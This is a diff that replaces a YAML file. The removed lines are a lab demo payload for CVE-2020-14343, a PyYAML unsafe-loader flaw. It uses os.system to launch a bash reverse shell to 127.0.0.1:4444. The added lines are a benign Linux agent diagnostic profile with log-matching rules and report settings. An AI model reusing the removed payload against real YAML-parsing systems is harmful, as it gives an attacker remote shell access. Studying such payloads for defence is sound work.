@@ -1,5 +1,40 @@
-# CVE-2020-14343 demo payload — PyYAML unsafe Loader deserialization
-# This YAML will execute a reverse shell when loaded with yaml.Loader.
-# Lab demo use only.
-!!python/object/apply:os.system
-- "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
+profile_name: "Linux Agent Basic Diagnostic"
+version: "1.0"
+
+log_sources:
+  - name: "agent log"
+    path: "agent.log"
+    type: text
+
+  - name: "system log"
+    path: "system.log"
+    type: text
+
+rules:
+  - id: "AGENT-001"
+    description: "Agent failed to connect to management server"
+    severity: "high"
+    match:
+      file: "agent.log"
+      contains: "connection refused"
+
+  - id: "AGENT-002"
+    description: "Authentication token expired"
+    severity: "medium"
+    match:
+      file: "agent.log"
+      contains: "token expired"
+
+  - id: "SYS-001"
+    description: "Disk space is low"
+    severity: "medium"
+    match:
+      file: "system.log"
+      contains: "No space left on device"
+
+report:
+  title: "Linux Agent Diagnostic Report"
+  include_sections:
+    - "summary"
+    - "matched_rules"
+    - "recommended_actions"
